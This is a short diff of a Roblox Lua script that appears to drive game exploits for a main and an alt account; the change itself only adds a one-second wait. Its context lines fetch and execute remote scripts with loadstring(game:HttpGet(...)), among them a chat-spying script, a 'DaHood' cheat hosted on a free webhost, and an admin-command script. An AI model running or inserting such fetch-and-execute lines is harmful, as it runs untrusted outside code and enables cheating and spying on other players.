@@ -1,6 +1,7 @@
 repeat wait() until game:IsLoaded()
 loadstring(game:HttpGet("https://raw.githubusercontent.com/dehoisted/Chat-Spy/main/source/main.lua"))();
 if game.Players.LocalPlayer.Name == Settings.Main then
+    wait(1)
     loadstring(game:HttpGet("https://unset-order.000webhostapp.com/scripts/DaHood.lua"))();
     loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
 if game.Players.LocalPlayer.Name == Settings.Alt then
